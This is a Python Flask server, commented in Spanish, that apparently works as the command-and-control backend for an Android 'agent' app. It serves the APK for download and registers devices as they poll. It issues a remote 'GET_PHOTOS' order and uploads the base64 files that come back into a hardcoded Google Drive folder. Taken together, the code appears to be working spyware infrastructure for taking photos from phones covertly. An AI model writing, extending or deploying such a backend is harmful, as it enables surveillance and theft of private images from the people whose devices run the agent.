
import os
import json
import base64
import uuid
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from io import BytesIO
from google.oauth2.service_account import Credentials

# --- CONFIGURACIÓN ---
DRIVE_FOLDER_ID = '1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO'
DEVICES_DB_FILE = 'devices.json'
app = Flask(__name__)
drive = None
pending_command = None 

# --- Funciones de Datos ---
def load_data(filepath, default_data):
    if not os.path.exists(filepath): return default_data
    try:
        with open(filepath, 'r') as f: return json.load(f)
    except Exception: return default_data
def save_data(filepath, data):
    with open(filepath, 'w') as f: json.dump(data, f, indent=4)

# --- Autenticación ---
def authenticate_gdrive():
    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
    if not secrets_json_str: raise Exception("Var de entorno GOOGLE_CLIENT_SECRETS no encontrada.")
    secrets_dict = json.loads(secrets_json_str)
    credentials = Credentials.from_service_account_info(secrets_dict, scopes=['https://www.googleapis.com/auth/drive'])
    gauth = GoogleAuth(); gauth.credentials = credentials
    return GoogleDrive(gauth)

# --- Endpoints ---

@app.route('/')
def serve_index(): return send_from_directory('.', 'index.html')

@app.route('/download/agent')
def download_agent_apk():
    try: return send_from_directory('public', 'app-debug.apk', as_attachment=True)
    except FileNotFoundError: return "APK no encontrado.", 404

@app.route('/trigger-fetch', methods=['POST'])
def trigger_fetch_command():
    global pending_command
    pending_command = "GET_PHOTOS"
    print("[SERVER] Orden 'GET_PHOTOS' recibida y activada.")
    return jsonify({"status": "success"})

@app.route('/get-command')
def get_command_for_agent():
    global pending_command
    device_id = request.args.get('deviceId')
    device_name = request.args.get('deviceName', 'Dispositivo Desconocido')
    
    if not device_id: return jsonify({"command": "NONE"}), 400

    devices = load_data(DEVICES_DB_FILE, {})
    devices.setdefault(device_id, {'status': 'active'})
    devices[device_id]['name'] = device_name
    devices[device_id]['last_seen'] = str(datetime.now())
    save_data(DEVICES_DB_FILE, devices)
    
    if devices[device_id]['status'] == 'paused': return jsonify({"command": "NONE"})

    if pending_command:
        command_to_send = pending_command
        pending_command = None
        print(f"[SERVER] Entregando orden '{command_to_send}' a {device_name}")
        return jsonify({"command": command_to_send})
        
    return jsonify({"command": "NONE"})

@app.route('/get-devices', methods=['GET'])
def get_devices():
    return jsonify(load_data(DEVICES_DB_FILE, {}))

@app.route('/toggle-status', methods=['POST'])
def toggle_status():
    device_id = request.json.get('deviceId')
    devices = load_data(DEVICES_DB_FILE, {})
    if device_id in devices:
        current_status = devices[device_id].get('status', 'active')
        devices[device_id]['status'] = 'paused' if current_status == 'active' else 'active'
        save_data(DEVICES_DB_FILE, devices)
        return jsonify({"status": "success", "new_state": devices[device_id]['status']})
    return jsonify({"status": "error", "message": "Device not found"}), 404

@app.route('/upload', methods=['POST'])
def upload_to_drive():
    global drive
    if not drive:
        return jsonify({"status": "error", "message": "Conexión con Google Drive no inicializada."}), 503

    data = request.json
    if not data or 'files' not in data:
        return jsonify({"status": "error", "message": "Formato de datos incorrecto."}), 400

    for file_info in data.get('files', []):
        try:
            file_bytes = base64.b64decode(file_info.get('data', ''))
            file_in_memory = BytesIO(file_bytes)
            unique_filename = f"{uuid.uuid4().hex}_{file_info.get('name')}"
            
            drive_file = drive.CreateFile({'title': unique_filename, 'parents': [{'id': DRIVE_FOLDER_ID}]})
            drive_file.content = file_in_memory
            drive_file.Upload()
            print(f"  [SUCCESS] Archivo subido: {unique_filename}")
        except Exception as e:
            print(f"  [ERROR] Falló la subida para '{file_info.get('name')}': {e}")
            
    return jsonify({"status": "success"})

# --- INICIALIZACIÓN ---
with app.app_context():
    try:
        drive = authenticate_gdrive()
        print("Autenticación con Google Drive exitosa al arrancar.")
    except Exception as e:
        print(f"ERROR CRÍTICO AL ARRANCAR: {e}")
